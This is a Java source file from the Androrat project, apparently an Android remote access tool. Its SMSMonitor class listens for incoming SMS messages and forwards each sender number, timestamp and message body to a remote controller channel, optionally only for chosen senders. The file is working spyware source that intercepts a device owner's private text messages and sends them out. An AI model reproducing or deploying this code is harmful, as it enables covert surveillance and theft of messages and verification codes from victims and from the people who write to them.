/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.util.ArrayList;
import java.util.HashSet;

import utils.EncoderHelper;
import my.app.activityclient.ClientListener;
import Packet.SMSPacket;
import Packet.ShortSMSPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSMonitor {

	ClientListener ctx;
	HashSet<String> phoneNumberFilter;
	int channel;
	
	public SMSMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
        ctx.registerReceiver(SMSreceiver, filter);
	}
	
	public void stop() {
		ctx.unregisterReceiver(SMSreceiver);
	}
	
	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
	 	
	 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	 
        @Override
        public void onReceive(Context context, Intent intent) {

		 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
		 		Log.i("SMSReceived", "onReceive sms !");
		 		
				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] pdus = (Object[]) bundle.get("pdus");
					 
					final SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++)  {
						 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					if (messages.length > -1) {
						
						 String messageBody = messages[0].getMessageBody();
						 String phoneNumber = messages[0].getDisplayOriginatingAddress();
						 long date = messages[0].getTimestampMillis();
						 
						 if(phoneNumberFilter == null) {
							 	ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
								ctx.handleData(channel, sms.build());
						 }
						 else {
							 if (phoneNumberFilter.contains(phoneNumber)) {
								 Log.i("SMSReceived", "Message accepted as triggering message !");
								 ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
								 ctx.handleData(channel, sms.build());
							 }
						 }
					}
				}
		 	}
        }
 };
	
	
}
